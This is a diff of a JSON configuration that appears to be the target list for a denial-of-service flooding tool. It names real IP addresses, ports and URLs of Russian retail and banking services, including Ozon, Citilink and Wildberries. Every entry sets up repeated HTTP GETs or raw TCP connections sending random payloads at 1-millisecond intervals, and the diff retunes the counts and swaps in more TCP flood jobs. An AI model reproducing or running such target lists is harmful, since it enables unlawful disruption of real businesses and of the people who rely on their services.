+            "addr": "195.34.20.248:8443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://profit.ozon.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "195.34.20.248:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://profit.ozon.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "195.34.20.248:8443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "91.223.93.15:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "91.223.93.15:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "http",
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -1181,77 +965,70 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 4,
+      "type": "tcp",
+      "count": 3,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://job.ozon.ru/it/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.223.93.15:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://job.ozon.ru/it/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.223.93.15:8443",
-            "is_tls": "true"
-          }
-        }
+        "address": "91.223.93.15:8443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 4,
+      "count": 3,
       "args": {
         "address": "91.223.93.15:13000",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "91.223.93.15:443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "91.223.93.15:443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://corp.ozon.com/#keyfacts"
+          "path": "https://xapi.ozon.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "91.223.93.2:80",
-            "is_tls": "false"
+            "addr": "91.223.93.15:443",
+            "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://profit.ozon.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.223.93.15:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "91.223.93.2:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "91.223.93.2:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "http",
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -1265,46 +1042,24 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://corp.ozon.com/#keyfacts"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.223.93.2:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
       "type": "tcp",
-      "count": 4,
+      "count": 3,
       "args": {
         "address": "91.223.93.2:3333",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 4,
+      "type": "tcp",
+      "count": 3,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://corp.ozon.com/#keyfacts"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.223.93.2:8443",
-            "is_tls": "true"
-          }
-        }
+        "address": "91.223.93.2:8443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -1319,62 +1074,91 @@
       }
     }, {
       "type": "tcp",
-      "count": 4,
+      "count": 3,
       "args": {
         "address": "91.223.93.2:13000",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "91.223.93.2:443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "91.223.93.2:8443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "91.223.93.2:443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "91.223.93.2:8443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://card.ozon.ru/"
+          "path": "https://seller-edu.ozon.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "194.85.18.1:80",
-            "is_tls": "false"
+            "addr": "91.223.93.2:443",
+            "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://seller-edu.ozon.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.223.93.2:8443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://rocket.ozon.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.223.93.2:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://rocket.ozon.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.223.93.2:8443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "194.85.18.1:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "194.85.18.1:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "http",
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -1388,38 +1172,24 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 4,
+      "type": "tcp",
+      "count": 3,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://card.ozon.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "194.85.18.1:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "178.248.232.171:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "178.248.232.171:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://3ds-v2-challenge-test.bank.ozon.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.232.171:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -1433,38 +1203,24 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 4,
+      "type": "tcp",
+      "count": 3,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://3ds-v2-challenge-test.bank.ozon.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.232.171:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "185.73.193.39:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "185.73.193.39:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://crm.ozon.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.73.193.39:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -1478,38 +1234,16 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 4,
+      "type": "tcp",
+      "count": 3,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://crm.ozon.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.73.193.39:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "185.73.193.8:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://partner.ozon.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.73.193.8:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -1518,44 +1252,44 @@
         "client": {
           "static_host": {
             "addr": "185.73.193.8:443",
-            "is_tls": "false"
+            "is_tls": "true"
           }
         }
       }
     }, {
       "type": "tcp",
-      "count": 4,
+      "count": 3,
       "args": {
         "address": "185.73.193.8:636",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "tcp",
-      "count": 4,
+      "type": "http",
+      "count": 3,
       "args": {
-        "address": "185.73.193.8:8443",
+        "request": {
+          "method": "GET",
+          "path": "https://partner.ozon.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.73.193.8:8443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "185.73.193.8:80",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://avia.ozon.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.73.193.8:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -1564,44 +1298,44 @@
         "client": {
           "static_host": {
             "addr": "185.73.193.8:443",
-            "is_tls": "false"
+            "is_tls": "true"
           }
         }
       }
     }, {
       "type": "tcp",
-      "count": 4,
+      "count": 3,
       "args": {
         "address": "185.73.193.8:636",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "tcp",
-      "count": 4,
+      "type": "http",
+      "count": 3,
       "args": {
-        "address": "185.73.193.8:8443",
+        "request": {
+          "method": "GET",
+          "path": "https://avia.ozon.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.73.193.8:8443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "185.73.193.7:80",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://opendata.ozon.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.73.193.7:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -1610,269 +1344,262 @@
         "client": {
           "static_host": {
             "addr": "185.73.193.7:443",
-            "is_tls": "false"
+            "is_tls": "true"
           }
         }
       }
     }, {
       "type": "tcp",
-      "count": 4,
+      "count": 3,
       "args": {
         "address": "185.73.193.7:636",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "tcp",
-      "count": 4,
+      "type": "http",
+      "count": 3,
       "args": {
-        "address": "185.73.193.7:8443",
+        "request": {
+          "method": "GET",
+          "path": "https://opendata.ozon.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.73.193.7:8443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://www.citilink.ru/configurator/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "178.248.234.66:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://www.citilink.ru/configurator/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "178.248.234.66:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://s1.citilink.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "178.248.234.66:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://s1.citilink.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "178.248.234.66:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://used.s1.citilink.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "178.248.234.66:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://used.s1.citilink.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "178.248.234.66:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://promo.s1.citilink.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "178.248.234.66:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://promo.s1.citilink.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "178.248.234.66:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://items.s1.citilink.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "178.248.234.66:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://items.s1.citilink.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "178.248.234.66:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://banners.s1.citilink.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "178.248.234.66:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://banners.s1.citilink.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "178.248.234.66:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://content.s1.citilink.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "178.248.234.66:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://content.s1.citilink.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "178.248.234.66:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "185.99.8.6:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "185.99.8.6:443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.citilink.ru/configurator/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.66:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.citilink.ru/configurator/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.66:443",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://s1.citilink.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.66:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://s1.citilink.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.66:443",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://used.s1.citilink.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.66:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://used.s1.citilink.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.66:443",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://promo.s1.citilink.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.66:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://promo.s1.citilink.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.66:443",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://items.s1.citilink.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.66:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://items.s1.citilink.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.66:443",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://banners.s1.citilink.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.66:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://banners.s1.citilink.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.66:443",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://content.s1.citilink.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.66:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://content.s1.citilink.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.66:443",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://job.citilink.ru/vakansii/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.99.8.6:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://job.citilink.ru/vakansii/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.99.8.6:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -1887,30 +1614,31 @@
       }
     }, {
       "type": "tcp",
-      "count": 4,
+      "count": 3,
       "args": {
         "address": "185.99.8.6:9091",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 4,
+      "type": "tcp",
+      "count": 3,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.wildberries.ru/catalog/bytovaya-tehnika"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.138.252.1:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "185.138.252.1:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "185.138.252.1:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -1924,38 +1652,24 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 4,
+      "type": "tcp",
+      "count": 3,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.wildberries.ru/catalog/bytovaya-tehnika"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.138.252.1:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "185.138.253.1:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "185.138.253.1:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.wildberries.ru/catalog/bytovaya-tehnika"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.138.253.1:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -1969,38 +1683,24 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 4,
+      "type": "tcp",
+      "count": 3,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.wildberries.ru/catalog/bytovaya-tehnika"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.138.253.1:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "185.138.254.1:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "185.138.254.1:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.wildberries.ru/catalog/bytovaya-tehnika"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.138.254.1:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -2014,38 +1714,24 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 4,
+      "type": "tcp",
+      "count": 3,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.wildberries.ru/catalog/bytovaya-tehnika"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.138.254.1:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "185.62.200.36:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "185.62.200.36:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://seller.wildberries.ru/login/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.62.200.36:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -2059,123 +1745,39 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://seller.wildberries.ru/login/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.62.200.36:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://enginx.wildberries.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.62.200.33:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://enginx.wildberries.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.62.200.33:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://enginx.wildberries.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.62.200.33:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
       "type": "tcp",
-      "count": 4,
+      "count": 3,
       "args": {
-        "address": "185.62.200.33:1447",
+        "address": "185.62.200.33:80",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "185.62.200.33:1447",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "185.62.200.33:5555",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://enginx.wildberries.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.62.200.33:8443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "185.62.200.33:16443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 4,
+      "count": 3,
       "args": {
         "address": "185.62.200.33:443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://enginx.wildberries.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.62.200.33:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
       "type": "tcp",
-      "count": 4,
+      "count": 3,
       "args": {
         "address": "185.62.200.33:1447",
         "body": "{{ random_payload 10 }}",
@@ -2183,22 +1785,91 @@
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://am.wildberries.ru/"
+          "path": "https://enginx.wildberries.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "185.138.252.5:80",
+            "addr": "185.62.200.33:1447",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "185.62.200.33:5555",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "185.62.200.33:8443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "185.62.200.33:16443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://travel.wildberries.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.62.200.33:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://travel.wildberries.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.62.200.33:1447",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://am.wildberries.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.138.252.5:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -2213,22 +1884,22 @@
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://am.wildberries.ru/"
+          "path": "http://am.wildberries.ru/"
         },
         "client": {
           "static_host": {
             "addr": "185.138.253.5:80",
-            "is_tls": "true"
+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
